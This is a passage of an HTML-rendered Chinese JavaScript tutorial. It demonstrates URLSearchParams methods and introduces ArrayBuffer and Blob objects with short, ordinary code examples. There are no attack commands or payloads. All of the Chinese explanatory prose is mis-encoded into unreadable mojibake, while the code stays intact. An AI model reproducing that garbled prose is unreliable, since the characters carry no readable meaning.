</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><p>ä¸Šé¢ä»£ç ä¸­ï¼ŒæŸ¥è¯¢å­—ç¬¦ä¸²é‡Œé¢<code>foo</code>å·²ç»å­˜åœ¨äº†ï¼Œä½†æ˜¯<code>append</code>ä¾ç„¶ä¼šè¿½åŠ ä¸€ä¸ªåŒåé”®ã€‚</p> <h3 id="urlsearchparams-delete"><a href="#urlsearchparams-delete" class="header-anchor">#</a> URLSearchParams.delete()</h3> <p><code>delete()</code>æ–¹æ³•ç”¨æ¥åˆ é™¤æŒ‡å®šçš„æŸ¥è¯¢å‚æ•°ã€‚å®ƒæ¥å—é”®åä½œä¸ºå‚æ•°ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token keyword">var</span> params <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URLSearchParams</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">'foo'</span><span class="token operator">:</span> <span class="token number">1</span> <span class="token punctuation">,</span> <span class="token string">'bar'</span><span class="token operator">:</span> <span class="token number">2</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
params<span class="token punctuation">.</span><span class="token function">delete</span><span class="token punctuation">(</span><span class="token string">'bar'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
params<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">// &quot;foo=1&quot;</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><h3 id="urlsearchparams-has"><a href="#urlsearchparams-has" class="header-anchor">#</a> URLSearchParams.has()</h3> <p><code>has()</code>æ–¹æ³•è¿”å›ä¸€ä¸ªå¸ƒå°”å€¼ï¼Œè¡¨ç¤ºæŸ¥è¯¢å­—ç¬¦ä¸²æ˜¯å¦åŒ…å«æŒ‡å®šçš„é”®åã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token keyword">var</span> params <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URLSearchParams</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">'foo'</span><span class="token operator">:</span> <span class="token number">1</span> <span class="token punctuation">,</span> <span class="token string">'bar'</span><span class="token operator">:</span> <span class="token number">2</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
params<span class="token punctuation">.</span><span class="token function">has</span><span class="token punctuation">(</span><span class="token string">'bar'</span><span class="token punctuation">)</span> <span class="token comment">// true</span>
params<span class="token punctuation">.</span><span class="token function">has</span><span class="token punctuation">(</span><span class="token string">'baz'</span><span class="token punctuation">)</span> <span class="token comment">// false</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><h3 id="urlsearchparams-set"><a href="#urlsearchparams-set" class="header-anchor">#</a> URLSearchParams.set()</h3> <p><code>set()</code>æ–¹æ³•ç”¨æ¥è®¾ç½®æŸ¥è¯¢å­—ç¬¦ä¸²çš„é”®å€¼ã€‚</p> <p>å®ƒæ¥å—ä¸¤ä¸ªå‚æ•°ï¼Œç¬¬ä¸€ä¸ªæ˜¯é”®åï¼Œç¬¬äºŒä¸ªæ˜¯é”®å€¼ã€‚å¦‚æœæ˜¯å·²ç»å­˜åœ¨çš„é”®ï¼Œé”®å€¼ä¼šè¢«æ”¹å†™ï¼Œå¦åˆ™ä¼šè¢«è¿½åŠ ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token keyword">var</span> params <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URLSearchParams</span><span class="token punctuation">(</span><span class="token string">'?foo=1'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
params<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">'foo'</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
params<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">// &quot;foo=2&quot;</span>
params<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">'bar'</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
params<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">// &quot;foo=2&amp;bar=3&quot;</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br></div></div><p>ä¸Šé¢ä»£ç ä¸­ï¼Œ<code>foo</code>æ˜¯å·²ç»å­˜åœ¨çš„é”®ï¼Œ<code>bar</code>æ˜¯è¿˜ä¸å­˜åœ¨çš„é”®ã€‚</p> <p>å¦‚æœæœ‰å¤šä¸ªçš„åŒåé”®ï¼Œ<code>set</code>ä¼šç§»é™¤ç°å­˜æ‰€æœ‰çš„é”®ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token keyword">var</span> params <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URLSearchParams</span><span class="token punctuation">(</span><span class="token string">'?foo=1&amp;foo=2'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
params<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">'foo'</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
params<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">// &quot;foo=3&quot;</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><p>ä¸‹é¢æ˜¯ä¸€ä¸ªæ›¿æ¢å½“å‰ URL çš„ä¾‹å­ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token comment">// URL: https://example.com?version=1.0</span>
<span class="token keyword">var</span> params <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URLSearchParams</span><span class="token punctuation">(</span>location<span class="token punctuation">.</span>search<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
params<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">'version'</span><span class="token punctuation">,</span> <span class="token number">2.0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

window<span class="token punctuation">.</span>history<span class="token punctuation">.</span><span class="token function">replaceState</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> location<span class="token punctuation">.</span>pathname <span class="token operator">+</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">?</span><span class="token template-punctuation string">`</span></span> <span class="token operator">+</span> params<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// URL: https://example.com?version=2.0</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br></div></div><h3 id="urlsearchparams-get-ï¼Œurlsearchparams-getall"><a href="#urlsearchparams-get-ï¼Œurlsearchparams-getall" class="header-anchor">#</a> URLSearchParams.get()ï¼ŒURLSearchParams.getAll()</h3> <p><code>get()</code>æ–¹æ³•ç”¨æ¥è¯»å–æŸ¥è¯¢å­—ç¬¦ä¸²é‡Œé¢çš„æŒ‡å®šé”®ã€‚å®ƒæ¥å—é”®åä½œä¸ºå‚æ•°ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token keyword">var</span> params <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URLSearchParams</span><span class="token punctuation">(</span><span class="token string">'?foo=1'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
params<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'foo'</span><span class="token punctuation">)</span> <span class="token comment">// &quot;1&quot;</span>
params<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'bar'</span><span class="token punctuation">)</span> <span class="token comment">// null</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><p>ä¸¤ä¸ªåœ°æ–¹éœ€è¦æ³¨æ„ã€‚ç¬¬ä¸€ï¼Œå®ƒè¿”å›çš„æ˜¯å­—ç¬¦ä¸²ï¼Œå¦‚æœåŸå§‹å€¼æ˜¯æ•°å€¼ï¼Œéœ€è¦è½¬ä¸€ä¸‹ç±»å‹ï¼›ç¬¬äºŒï¼Œå¦‚æœæŒ‡å®šçš„é”®åä¸å­˜åœ¨ï¼Œè¿”å›å€¼æ˜¯<code>null</code>ã€‚</p> <p>å¦‚æœæœ‰å¤šä¸ªçš„åŒåé”®ï¼Œ<code>get</code>è¿”å›ä½ç½®æœ€å‰é¢çš„é‚£ä¸ªé”®å€¼ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token keyword">var</span> params <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URLSearchParams</span><span class="token punctuation">(</span><span class="token string">'?foo=3&amp;foo=2&amp;foo=1'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
params<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'foo'</span><span class="token punctuation">)</span> <span class="token comment">// &quot;3&quot;</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><p>ä¸Šé¢ä»£ç ä¸­ï¼ŒæŸ¥è¯¢å­—ç¬¦ä¸²æœ‰ä¸‰ä¸ª<code>foo</code>é”®ï¼Œ<code>get</code>æ–¹æ³•è¿”å›æœ€å‰é¢çš„é”®å€¼<code>3</code>ã€‚</p> <p><code>getAll()</code>æ–¹æ³•è¿”å›ä¸€ä¸ªæ•°ç»„ï¼Œæˆå‘˜æ˜¯æŒ‡å®šé”®çš„æ‰€æœ‰é”®å€¼ã€‚å®ƒæ¥å—é”®åä½œä¸ºå‚æ•°ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token keyword">var</span> params <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URLSearchParams</span><span class="token punctuation">(</span><span class="token string">'?foo=1&amp;foo=2'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
params<span class="token punctuation">.</span><span class="token function">getAll</span><span class="token punctuation">(</span><span class="token string">'foo'</span><span class="token punctuation">)</span> <span class="token comment">// [&quot;1&quot;, &quot;2&quot;]</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><p>ä¸Šé¢ä»£ç ä¸­ï¼ŒæŸ¥è¯¢å­—ç¬¦ä¸²æœ‰ä¸¤ä¸ª<code>foo</code>é”®ï¼Œ<code>getAll</code>è¿”å›çš„æ•°ç»„å°±æœ‰ä¸¤ä¸ªæˆå‘˜ã€‚</p> <h3 id="urlsearchparams-sort"><a href="#urlsearchparams-sort" class="header-anchor">#</a> URLSearchParams.sort()</h3> <p><code>sort()</code>æ–¹æ³•å¯¹æŸ¥è¯¢å­—ç¬¦ä¸²é‡Œé¢çš„é”®è¿›è¡Œæ’åºï¼Œè§„åˆ™æ˜¯æŒ‰ç…§ Unicode ç ç‚¹ä»å°åˆ°å¤§æ’åˆ—ã€‚</p> <p>è¯¥æ–¹æ³•æ²¡æœ‰è¿”å›å€¼ï¼Œæˆ–è€…è¯´è¿”å›å€¼æ˜¯<code>undefined</code>ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token keyword">var</span> params <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URLSearchParams</span><span class="token punctuation">(</span><span class="token string">'c=4&amp;a=2&amp;b=3&amp;a=1'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
params<span class="token punctuation">.</span><span class="token function">sort</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
params<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">// &quot;a=2&amp;a=1&amp;b=3&amp;c=4&quot;</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><p>ä¸Šé¢ä»£ç ä¸­ï¼Œå¦‚æœæœ‰ä¸¤ä¸ªåŒåçš„é”®<code>a</code>ï¼Œå®ƒä»¬ä¹‹é—´ä¸ä¼šæ’åºï¼Œè€Œæ˜¯ä¿ç•™åŸå§‹çš„é¡ºåºã€‚</p> <h3 id="urlsearchparams-keys-ï¼Œurlsearchparams-values-ï¼Œurlsearchparams-entries"><a href="#urlsearchparams-keys-ï¼Œurlsearchparams-values-ï¼Œurlsearchparams-entries" class="header-anchor">#</a> URLSearchParams.keys()ï¼ŒURLSearchParams.values()ï¼ŒURLSearchParams.entries()</h3> <p>è¿™ä¸‰ä¸ªæ–¹æ³•éƒ½è¿”å›ä¸€ä¸ªéå†å™¨å¯¹è±¡ï¼Œä¾›<code>for...of</code>å¾ªç¯éå†ã€‚å®ƒä»¬çš„åŒºåˆ«åœ¨äºï¼Œ<code>keys</code>æ–¹æ³•è¿”å›çš„æ˜¯é”®åçš„éå†å™¨ï¼Œ<code>values</code>æ–¹æ³•è¿”å›çš„æ˜¯é”®å€¼çš„éå†å™¨ï¼Œ<code>entries</code>è¿”å›çš„æ˜¯é”®å€¼å¯¹çš„éå†å™¨ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token keyword">var</span> params <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URLSearchParams</span><span class="token punctuation">(</span><span class="token string">'a=1&amp;b=2'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">var</span> p <span class="token keyword">of</span> params<span class="token punctuation">.</span><span class="token function">keys</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token comment">// a</span>
<span class="token comment">// b</span>

<span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">var</span> p <span class="token keyword">of</span> params<span class="token punctuation">.</span><span class="token function">values</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token comment">// 1</span>
<span class="token comment">// 2</span>

<span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">var</span> p <span class="token keyword">of</span> params<span class="token punctuation">.</span><span class="token function">entries</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token comment">// [&quot;a&quot;, &quot;1&quot;]</span>
<span class="token comment">// [&quot;b&quot;, &quot;2&quot;]</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br></div></div><p>å¦‚æœç›´æ¥å¯¹<code>URLSearchParams</code>è¿›è¡Œéå†ï¼Œå…¶å®å†…éƒ¨è°ƒç”¨çš„å°±æ˜¯<code>entries</code>æ¥å£ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> p <span class="token keyword">of</span> params<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
<span class="token comment">// ç­‰åŒäº</span>
<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> p <span class="token keyword">of</span> params<span class="token punctuation">.</span><span class="token function">entries</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><h2 id="åã€arraybuffer-å¯¹è±¡ï¼Œblob-å¯¹è±¡"><a href="#åã€arraybuffer-å¯¹è±¡ï¼Œblob-å¯¹è±¡" class="header-anchor">#</a> åã€ArrayBuffer å¯¹è±¡ï¼ŒBlob å¯¹è±¡</h2> <h2 id="_1-arraybuffer-å¯¹è±¡"><a href="#_1-arraybuffer-å¯¹è±¡" class="header-anchor">#</a> 1.ArrayBuffer å¯¹è±¡</h2> <p>ArrayBuffer å¯¹è±¡è¡¨ç¤ºä¸€æ®µäºŒè¿›åˆ¶æ•°æ®ï¼Œç”¨æ¥æ¨¡æ‹Ÿå†…å­˜é‡Œé¢çš„æ•°æ®ã€‚é€šè¿‡è¿™ä¸ªå¯¹è±¡ï¼ŒJavaScript å¯ä»¥è¯»å†™äºŒè¿›åˆ¶æ•°æ®ã€‚è¿™ä¸ªå¯¹è±¡å¯ä»¥çœ‹ä½œå†…å­˜æ•°æ®çš„è¡¨è¾¾ã€‚</p> <p>è¿™ä¸ªå¯¹è±¡æ˜¯ ES6 æ‰å†™å…¥æ ‡å‡†çš„ï¼Œæ™®é€šçš„ç½‘é¡µç¼–ç¨‹ç”¨ä¸åˆ°å®ƒï¼Œä¸ºäº†æ•™ç¨‹ä½“ç³»çš„å®Œæ•´ï¼Œä¸‹é¢åªæä¾›ä¸€ä¸ªç®€ç•¥çš„ä»‹ç»ï¼Œè¯¦ç»†ä»‹ç»è¯·çœ‹ã€ŠES6 æ ‡å‡†å…¥é—¨ã€‹é‡Œé¢çš„ç« èŠ‚ã€‚</p> <p>æµè§ˆå™¨åŸç”Ÿæä¾›<code>ArrayBuffer()</code>æ„é€ å‡½æ•°ï¼Œç”¨æ¥ç”Ÿæˆå®ä¾‹ã€‚å®ƒæ¥å—ä¸€ä¸ªæ•´æ•°ä½œä¸ºå‚æ•°ï¼Œè¡¨ç¤ºè¿™æ®µäºŒè¿›åˆ¶æ•°æ®å ç”¨å¤šå°‘ä¸ªå­—èŠ‚ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token keyword">var</span> buffer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayBuffer</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>ä¸Šé¢ä»£ç ä¸­ï¼Œå®ä¾‹å¯¹è±¡<code>buffer</code>å ç”¨8ä¸ªå­—èŠ‚ã€‚</p> <p>ArrayBuffer å¯¹è±¡æœ‰å®ä¾‹å±æ€§<code>byteLength</code>ï¼Œè¡¨ç¤ºå½“å‰å®ä¾‹å ç”¨çš„å†…å­˜é•¿åº¦ï¼ˆå•ä½å­—èŠ‚ï¼‰ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token keyword">var</span> buffer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayBuffer</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
buffer<span class="token punctuation">.</span>byteLength <span class="token comment">// 8</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>ArrayBuffer å¯¹è±¡æœ‰å®ä¾‹æ–¹æ³•<code>slice()</code>ï¼Œç”¨æ¥å¤åˆ¶ä¸€éƒ¨åˆ†å†…å­˜ã€‚å®ƒæ¥å—ä¸¤ä¸ªæ•´æ•°å‚æ•°ï¼Œåˆ†åˆ«è¡¨ç¤ºå¤åˆ¶çš„å¼€å§‹ä½ç½®ï¼ˆä»0å¼€å§‹ï¼‰å’Œç»“æŸä½ç½®ï¼ˆå¤åˆ¶æ—¶ä¸åŒ…æ‹¬ç»“æŸä½ç½®ï¼‰ï¼Œå¦‚æœçœç•¥ç¬¬äºŒä¸ªå‚æ•°ï¼Œåˆ™è¡¨ç¤ºä¸€ç›´å¤åˆ¶åˆ°ç»“æŸã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token keyword">var</span> buf1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayBuffer</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> buf2 <span class="token operator">=</span> buf1<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>ä¸Šé¢ä»£ç è¡¨ç¤ºå¤åˆ¶åŸæ¥çš„å®ä¾‹ã€‚</p> <h2 id="_2-blob-å¯¹è±¡"><a href="#_2-blob-å¯¹è±¡" class="header-anchor">#</a> 2.Blob å¯¹è±¡</h2> <h3 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="header-anchor">#</a> ç®€ä»‹</h3> <p>Blob å¯¹è±¡è¡¨ç¤ºä¸€ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶çš„æ•°æ®å†…å®¹ï¼Œæ¯”å¦‚ä¸€ä¸ªå›¾ç‰‡æ–‡ä»¶çš„å†…å®¹å°±å¯ä»¥é€šè¿‡ Blob å¯¹è±¡è¯»å†™ã€‚å®ƒé€šå¸¸ç”¨æ¥è¯»å†™æ–‡ä»¶ï¼Œå®ƒçš„åå­—æ˜¯ Binary Large Object ï¼ˆäºŒè¿›åˆ¶å¤§å‹å¯¹è±¡ï¼‰çš„ç¼©å†™ã€‚å®ƒä¸ ArrayBuffer çš„åŒºåˆ«åœ¨äºï¼Œå®ƒç”¨äºæ“ä½œäºŒè¿›åˆ¶æ–‡ä»¶ï¼Œè€Œ ArrayBuffer ç”¨äºæ“ä½œå†…å­˜ã€‚</p> <p>æµè§ˆå™¨åŸç”Ÿæä¾›<code>Blob()</code>æ„é€ å‡½æ•°ï¼Œç”¨æ¥ç”Ÿæˆå®ä¾‹å¯¹è±¡ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token keyword">new</span> <span class="token class-name">Blob</span><span class="token punctuation">(</span>array <span class="token punctuation">[</span><span class="token punctuation">,</span> options<span class="token punctuation">]</span><span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p><code>Blob</code>æ„é€ å‡½æ•°æ¥å—ä¸¤ä¸ªå‚æ•°ã€‚ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯æ•°ç»„ï¼Œæˆå‘˜æ˜¯å­—ç¬¦ä¸²æˆ–äºŒè¿›åˆ¶å¯¹è±¡ï¼Œè¡¨ç¤ºæ–°ç”Ÿæˆçš„<code>Blob</code>å®ä¾‹å¯¹è±¡çš„å†…å®¹ï¼›ç¬¬äºŒä¸ªå‚æ•°æ˜¯å¯é€‰çš„ï¼Œæ˜¯ä¸€ä¸ªé…ç½®å¯¹è±¡ï¼Œç›®å‰åªæœ‰ä¸€ä¸ªå±æ€§<code>type</code>ï¼Œå®ƒçš„å€¼æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œè¡¨ç¤ºæ•°æ®çš„ MIME ç±»å‹ï¼Œé»˜è®¤æ˜¯ç©ºå­—ç¬¦ä¸²ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token keyword">var</span> htmlFragment <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'&lt;a id=&quot;a&quot;&gt;&lt;b id=&quot;b&quot;&gt;hey!&lt;/b&gt;&lt;/a&gt;'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> myBlob <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Blob</span><span class="token punctuation">(</span>htmlFragment<span class="token punctuation">,</span> <span class="token punctuation">{</span>type <span class="token operator">:</span> <span class="token string">'text/html'</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>ä¸Šé¢ä»£ç ä¸­ï¼Œå®ä¾‹å¯¹è±¡<code>myBlob</code>åŒ…å«çš„æ˜¯å­—ç¬¦ä¸²ã€‚ç”Ÿæˆå®ä¾‹çš„æ—¶å€™ï¼Œæ•°æ®ç±»å‹æŒ‡å®šä¸º<code>text/html</code>ã€‚</p> <p>ä¸‹é¢æ˜¯å¦ä¸€ä¸ªä¾‹å­ï¼ŒBlob ä¿å­˜ JSON æ•°æ®ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token keyword">var</span> obj <span class="token operator">=</span> <span class="token punctuation">{</span> hello<span class="token operator">:</span> <span class="token string">'world'</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> blob <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Blob</span><span class="token punctuation">(</span><span class="token punctuation">[</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span> <span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>type <span class="token operator">:</span> <span class="token string">'application/json'</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><h3 id="å®ä¾‹å±æ€§å’Œå®ä¾‹æ–¹æ³•"><a href="#å®ä¾‹å±æ€§å’Œå®ä¾‹æ–¹æ³•" class="header-anchor">#</a> å®ä¾‹å±æ€§å’Œå®ä¾‹æ–¹æ³•</h3> <p><code>Blob</code>å…·æœ‰ä¸¤ä¸ªå®ä¾‹å±æ€§<code>size</code>å’Œ<code>type</code>ï¼Œåˆ†åˆ«è¿”å›æ•°æ®çš„å¤§å°å’Œç±»å‹ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token keyword">var</span> htmlFragment <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'&lt;a id=&quot;a&quot;&gt;&lt;b id=&quot;b&quot;&gt;hey!&lt;/b&gt;&lt;/a&gt;'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> myBlob <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Blob</span><span class="token punctuation">(</span>htmlFragment<span class="token punctuation">,</span> <span class="token punctuation">{</span>type <span class="token operator">:</span> <span class="token string">'text/html'</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

myBlob<span class="token punctuation">.</span>size <span class="token comment">// 32</span>
myBlob<span class="token punctuation">.</span>type <span class="token comment">// &quot;text/html&quot;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br></div></div><p><code>Blob</code>å…·æœ‰ä¸€ä¸ªå®ä¾‹æ–¹æ³•<code>slice</code>ï¼Œç”¨æ¥æ‹·è´åŸæ¥çš„æ•°æ®ï¼Œè¿”å›çš„ä¹Ÿæ˜¯ä¸€ä¸ª<code>Blob</code>å®ä¾‹ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code>myBlob<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span>start<span class="token punctuation">,</span> end<span class="token punctuation">,</span> contentType<span class="token punctuation">)</span>
